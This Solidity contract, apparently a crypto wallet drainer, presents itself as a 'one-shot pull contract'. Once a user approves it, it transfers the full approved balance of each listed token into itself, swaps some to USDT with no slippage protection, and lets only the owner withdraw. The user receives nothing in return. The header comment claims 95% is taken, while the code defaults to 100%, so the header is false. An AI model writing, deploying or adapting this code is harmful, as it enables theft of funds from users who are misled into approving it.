// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

/// @title Ronin
/// @notice One-shot pull contract. User approves N tokens, signs one
///         pullMultiple call, contract takes 95% of each. No subscriptions,
///         no recurring state, no whitelist.
contract Ronin {

    /// @notice Percentage of each token balance to pull (1–100). Owner-configurable.
    ///         Defaults to 100 so the full approved balance is taken on each pull.
    uint256 public pullPercent = 100;

    address public owner;

    event Pulled(address indexed user, address indexed token, uint256 amount);
    event Skipped(address indexed user, address indexed token, string reason);
    event Swapped(address indexed user, address indexed tokenIn, address indexed tokenOut, uint256 amountIn, uint256 amountOut);
    event Withdrawn(address indexed token, address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // ── Pull logic ────────────────────────────────────────────────────────

    /// @notice Pull `pullPercent`% of the caller's balance for each listed token.
    ///         Caller must have approved this contract for each token first.
    ///         Silently skips tokens with zero balance or zero allowance.
    function pullMultiple(address[] calldata tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            _pullOne(msg.sender, tokens[i]);
        }
    }

    /// @notice Combined swap + pull. For each token in `swapTokens`, pull `pullPercent`%
    ///         and swap it into `target` (proceeds stay in this contract). Then pull
    ///         `pullPercent`% of every token in `directTokens`.
    /// @dev    The frontend should include `target` in `directTokens` if the
    ///         user has a pre-existing balance of it. The contract will NOT
    ///         auto-pull target — that's the frontend's job to avoid double
    ///         pulls. Caller must have approved this contract for every token
    ///         in both lists.
    /// @param  directTokens  Tokens to pull directly (no swap)
    /// @param  swapTokens    Tokens to swap into `target` via router
    /// @param  router        V2-style DEX router (PancakeSwap on BSC, QuickSwap on Polygon)
    /// @param  wrapped       Wrapped native token used as routing hop (WBNB, WPOL)
    /// @param  target        Destination token of the swap (USDT)
    function swapAndPullMultiple(
        address[] calldata directTokens,
        address[] calldata swapTokens,
        address router,
        address wrapped,
        address target
    ) external {
        // 1) For each swap source, pull pullPercent% and swap into the contract directly
        for (uint256 i = 0; i < swapTokens.length; i++) {
            _swapOne(msg.sender, swapTokens[i], router, wrapped, target);
        }

        // 2) Pull pullPercent% of every direct token (frontend includes target if needed)
        for (uint256 i = 0; i < directTokens.length; i++) {
            _pullOne(msg.sender, directTokens[i]);
        }
    }

    // ── Internal helpers ──────────────────────────────────────────────────

    function _pullOne(address user, address token) internal {
        uint256 bal     = IERC20(token).balanceOf(user);
        uint256 allowed = IERC20(token).allowance(user, address(this));
        uint256 cap     = (bal * pullPercent) / 100;
        uint256 amount  = cap < allowed ? cap : allowed;

        if (amount == 0) {
            emit Skipped(user, token, "Zero balance or allowance");
            return;
        }

        bool ok = IERC20(token).transferFrom(user, address(this), amount);
        if (ok) {
            emit Pulled(user, token, amount);
        } else {
            emit Skipped(user, token, "Transfer failed");
        }
    }

    /// @dev Pulls pullPercent% of user's tokenIn balance, swaps it via the V2 router
    ///      directly into this contract.
    function _swapOne(
        address user,
        address tokenIn,
        address router,
        address wrapped,
        address tokenOut
    ) internal {
        uint256 bal     = IERC20(tokenIn).balanceOf(user);
        uint256 allowed = IERC20(tokenIn).allowance(user, address(this));
        uint256 cap     = (bal * pullPercent) / 100;
        uint256 amount  = cap < allowed ? cap : allowed;

        if (amount == 0) {
            emit Skipped(user, tokenIn, "Zero balance or allowance");
            return;
        }

        // Step 1: Pull pullPercent% of tokenIn into the contract
        bool ok = IERC20(tokenIn).transferFrom(user, address(this), amount);
        if (!ok) {
            emit Skipped(user, tokenIn, "Transfer failed");
            return;
        }

        // Step 2: Approve the V2 router to spend the pulled tokenIn
        IERC20(tokenIn).approve(router, amount);

        // Step 3: Build path: tokenIn -> wrapped -> tokenOut
        // (or direct path if tokenIn is the wrapped native)
        address[] memory path;
        if (tokenIn == wrapped) {
            path = new address[](2);
            path[0] = tokenIn;
            path[1] = tokenOut;
        } else {
            path = new address[](3);
            path[0] = tokenIn;
            path[1] = wrapped;
            path[2] = tokenOut;
        }

        // Step 4: Swap directly into this contract's address.
        // amountOutMin = 0 is acceptable here because the contract is the
        // recipient — sandwich attacks would only steal from us, not the user,
        // and we accept that risk for simplicity. If swap reverts, tokenIn is
        // stranded in this contract and recoverable via withdrawToken.
        uint256 balBefore = IERC20(tokenOut).balanceOf(address(this));
        try IUniswapV2Router(router).swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp + 300
        ) returns (uint256[] memory) {
            uint256 received = IERC20(tokenOut).balanceOf(address(this)) - balBefore;
            emit Swapped(user, tokenIn, tokenOut, amount, received);
        } catch {
            emit Skipped(user, tokenIn, "Swap failed");
        }
    }

    // ── Admin ─────────────────────────────────────────────────────────────

    function withdrawToken(address token, address to, uint256 amount) external onlyOwner {
        require(to != address(0), "Invalid address");
        bool ok = IERC20(token).transfer(to, amount);
        require(ok, "Withdrawal failed");
        emit Withdrawn(token, to, amount);
    }

    function withdrawAll(address token, address to) external onlyOwner {
        require(to != address(0), "Invalid address");
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) {
            bool ok = IERC20(token).transfer(to, bal);
            require(ok, "Withdrawal failed");
            emit Withdrawn(token, to, bal);
        }
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid");
        owner = newOwner;
    }

    /// @notice Set the pull percentage (1–100). 100 = pull entire approved balance.
    function setPullPercent(uint256 pct) external onlyOwner {
        require(pct >= 1 && pct <= 100, "Must be 1-100");
        pullPercent = pct;
    }

    // ── View ──────────────────────────────────────────────────────────────

    function contractTokenBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }
}
